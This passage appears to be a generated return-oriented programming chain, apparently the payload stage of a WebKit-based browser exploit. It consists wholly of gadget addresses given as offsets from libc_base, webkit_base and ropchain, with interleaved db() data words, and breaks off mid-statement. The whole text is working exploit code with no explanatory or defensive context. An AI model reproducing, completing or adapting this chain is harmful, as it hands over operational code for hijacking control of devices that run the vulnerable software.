set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+381672, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+395104, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967248, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+381744, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965056, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965056, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+381888, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+381904, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+382048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+382016, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+382032, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+398120, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+382200, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160240, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+382336, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+382304, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+382456, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+382440, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965048, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+382536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+382584, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965048, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+382688, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+382704, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+382848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+382816, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+382832, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+382928, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965064, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+383032, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+383048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+383192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+383160, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+383176, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+383272, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965072, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+383376, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+383392, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+383512, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+383528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+383496, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+383632, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+383648, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+383816, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+383832, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+383800, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+383936, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+383984, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+383952, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+384096, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+384088, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+384112, 
ropchain+384128, 
libc_base+811575, 
ropchain+384144, 
libc_base+811575, 
ropchain+388512, 
libc_base+793877, 
ropchain+384184, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965072, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+384288, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+384304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+384448, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+384416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+384432, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+384520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+384576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+384656, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965048, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+384760, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+384776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+384896, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+384912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+384880, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+385000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+385056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+385176, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+385208, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+385192, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+385368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+385336, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+385320, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+385424, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+385528, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+385560, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+385544, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+385720, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+385688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+385672, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+385776, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+385880, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+385912, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+385896, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+386072, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+386040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+386024, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+386128, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+386232, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+386264, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+386248, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+386336, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+386352, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+386512, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+386480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+386464, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+386568, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+386672, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+386704, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+386688, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+386800, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+386784, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+386880, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965056, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+386984, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+387000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+387144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+387112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+387128, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+387216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+387272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+387352, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965048, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+387456, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+387472, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+387592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+387608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+387576, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+387696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+387752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+387824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+387880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+387968, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965048, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+388072, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+388088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+388232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+388200, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+388216, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+388320, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+388376, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965048, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+388456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+382544, 
libc_base+788575 
]);
db([6, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+388624, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+300808, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+388696, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+388800, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+388816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+388960, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+388928, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+388944, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+389040, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965056, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+389144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+389160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+389304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+389272, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+389288, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+389408, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+396432, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([7, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+389552, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+300808, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+389624, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+389728, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+389744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+389888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+389856, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+389872, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+389968, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965056, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+390072, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+390088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+390232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+390200, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+390216, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+390336, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+396432, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+390408, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+390560, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+390576, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+390544, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+390672, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+390688, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+390800, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+390784, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+390888, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+390872, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+390984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+391000, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+391112, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+391096, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
